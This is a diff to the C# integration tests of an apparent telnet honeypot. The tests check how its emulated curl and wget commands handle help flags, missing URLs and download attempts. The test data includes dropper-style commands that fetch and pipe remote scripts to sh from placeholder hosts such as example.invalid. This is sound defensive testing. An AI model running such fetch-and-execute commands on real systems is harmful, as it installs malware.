@@ -14,6 +14,87 @@ namespace TelemoqNet.IntegrationTests;
 public sealed class PayloadDownloadTests
 {
     [Theory]
+    [InlineData("curl --help", "Usage: curl [options...] <url>")]
+    [InlineData("curl -h", "Usage: curl [options...] <url>")]
+    [InlineData("curl --help all", "Usage: curl [options...] <url>")]
+    [InlineData("curl --version", "curl 7.36.0")]
+    [InlineData("curl -V", "curl 7.36.0")]
+    [InlineData("curl --help http://example.invalid/bot", "Usage: curl [options...] <url>")]
+    [InlineData("curl http://example.invalid/bot --help", "Usage: curl [options...] <url>")]
+    [InlineData("curl --version http://example.invalid/bot", "curl 7.36.0")]
+    [InlineData("wget --help", "Usage: wget [OPTIONS] URL...")]
+    [InlineData("wget -h", "Usage: wget [OPTIONS] URL...")]
+    [InlineData("wget --version", "BusyBox v1.19.4")]
+    [InlineData("wget -V", "BusyBox v1.19.4")]
+    [InlineData("busybox wget --help", "Usage: wget [OPTIONS] URL...")]
+    [InlineData("/bin/busybox wget --version", "BusyBox v1.19.4")]
+    [InlineData("wget --help http://example.invalid/bot", "Usage: wget [OPTIONS] URL...")]
+    public async Task Telnet_InformationalOptions_ReturnOutputWithoutDownloadAttempt(string command, string expected)
+    {
+        await using var fixture = await TelnetFixture.StartAsync();
+        await using var client = await fixture.ConnectAsync();
+        await client.LoginAsync();
+        await client.SendLineAsync(command, useCrNul: true);
+        var response = await client.ReadUntilAsync("# ");
+
+        Assert.Contains(expected, response);
+        Assert.DoesNotContain("no URL specified", response);
+        Assert.DoesNotContain("missing URL", response);
+        Assert.DoesNotContain("Network is unreachable", response);
+
+        await client.SendLineAsync("exit", useCrNul: true);
+        var session = await fixture.WaitForSessionAsync();
+        var captured = Assert.Single(session.Commands, entry => entry.Command == command);
+        Assert.Contains(expected, captured.Response);
+        Assert.DoesNotContain(session.Events, entry => entry.Type == "payload.download_attempt");
+    }
+
+    [Theory]
+    [InlineData("wget", "wget: missing URL")]
+    [InlineData("wget -q", "wget: missing URL")]
+    [InlineData("wget -O /tmp/bot", "wget: missing URL")]
+    [InlineData("wget --output-document http://example.invalid/output", "wget: missing URL")]
+    [InlineData("wget ''", "wget: missing URL")]
+    [InlineData("wget --", "wget: missing URL")]
+    [InlineData("curl", "curl: no URL specified!")]
+    [InlineData("curl -fsSL", "curl: no URL specified!")]
+    [InlineData("curl -o /tmp/bot", "curl: no URL specified!")]
+    [InlineData("curl --proxy http://proxy.invalid", "curl: no URL specified!")]
+    [InlineData("curl --url ''", "curl: no URL specified!")]
+    [InlineData("curl --url", "curl: no URL specified!")]
+    [InlineData("busybox wget", "wget: missing URL")]
+    [InlineData("/bin/busybox wget -O-", "wget: missing URL")]
+    public async Task Telnet_DownloadWithoutUrl_ReturnsUsageAndCapturesNoAttempt(string command, string error)
+    {
+        await using var fixture = await TelnetFixture.StartAsync();
+        await using var client = await fixture.ConnectAsync();
+        await client.LoginAsync();
+        await client.SendLineAsync(command, useCrNul: true);
+        var response = await client.ReadUntilAsync("# ");
+
+        Assert.Contains(error, response);
+        Assert.DoesNotContain("Network is unreachable", response);
+
+        await client.SendLineAsync("exit", useCrNul: true);
+        var session = await fixture.WaitForSessionAsync();
+        var captured = Assert.Single(session.Commands, entry => entry.Command == command);
+        Assert.Contains(error, captured.Response);
+        Assert.DoesNotContain(session.Events, entry => entry.Type == "payload.download_attempt");
+    }
+
+    [Theory]
+    [InlineData("wget")]
+    [InlineData("curl")]
+    [InlineData("busybox wget")]
+    public async Task SchemeLessDestination_IsStillTreatedAsUrlOperand(string tool)
+    {
+        var response = await Device().ExecuteCommandAsync(
+            $"{tool} example.invalid/bot", CancellationToken.None);
+
+        Assert.Contains("Network is unreachable", response);
+    }
+
+    [Theory]
     [InlineData("wget -q -O /tmp/bot http://example.invalid/bot.sh", "wget", "http://example.invalid/bot.sh")]
     [InlineData("/usr/bin/curl -fsSL 'https://example.invalid/a?x=1&y=2' -o /tmp/bot", "curl", "https://example.invalid/a?x=1&y=2")]
     [InlineData("/bin/busybox wget -O- ftp://example.invalid/bot", "wget", "ftp://example.invalid/bot")]
@@ -21,6 +102,10 @@ public sealed class PayloadDownloadTests
     [InlineData("curl --url=https://example.invalid/bot | sh", "curl", "https://example.invalid/bot")]
     [InlineData("curl --url \"http://example.invalid/bot\"", "curl", "http://example.invalid/bot")]
     [InlineData("curl --proxy http://proxy.invalid --header 'Referer: http://ref.invalid' http://example.invalid/bot", "curl", "http://example.invalid/bot")]
+    [InlineData("curl -o --help http://example.invalid/bot", "curl", "http://example.invalid/bot")]
+    [InlineData("curl --header '--version' http://example.invalid/bot", "curl", "http://example.invalid/bot")]
+    [InlineData("curl -- --help http://example.invalid/bot", "curl", "http://example.invalid/bot")]
+    [InlineData("wget -O --help http://example.invalid/bot", "wget", "http://example.invalid/bot")]
     public async Task Attempts_AreCapturedWithoutEvaluatingCommands(string command, string tool, string url)
     {
         var attempts = new List<PayloadDownloadAttempt>();
